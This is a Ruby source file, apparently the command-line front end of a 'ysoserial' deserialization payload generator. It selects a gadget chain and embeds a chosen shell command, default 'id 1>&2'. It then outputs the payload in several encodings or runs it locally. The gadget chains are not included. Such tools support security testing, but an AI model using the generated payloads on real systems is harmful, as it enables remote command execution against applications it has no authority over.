require "docopt"
require 'ysoserial/gadgets'

$doc = <<DOCOPT
ysoserial.rb generates deserialization payloads for a variety of ruby formatters.

Usage: ysoserial.rb [options]

Options:
  -o, --output=VALUE         The output format (raw|escaped|base64|hex). [default: raw]
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter (yaml|marshal). [default: marshal]
  -c, --command=VALUE        The command to be executed. [default: id 1>&2]
  -t, --test                 Whether to run payload locally. [default: false]
  -h, --help                 Shows this message and exit.

DOCOPT

class YSoSerial::CLI
  def self.start
    begin
      options = Docopt::docopt($doc)
    rescue Docopt::Exit => e
      puts e.message
      return
    end

    # import all gadgets
    gadgets = YSoSerial::Gadgets.table

    unless options["--gadget"]
      raise "Gadget not chosen"
    end
    gadget_symbol = options["--gadget"].to_sym
    unless gadgets.include? gadget_symbol
      raise "Gadget not found"
    end

    gadget_class = gadgets[gadget_symbol]
    command = options["--command"]
    gadget = gadget_class.new(command)

    function_args = [
      options["--formatter"].downcase.to_sym,
      options["--output"].downcase.to_sym,
    ]
    if options["--test"]
      gadget.test(*function_args)
    else
      puts gadget.generate(*function_args)
    end
  end
end
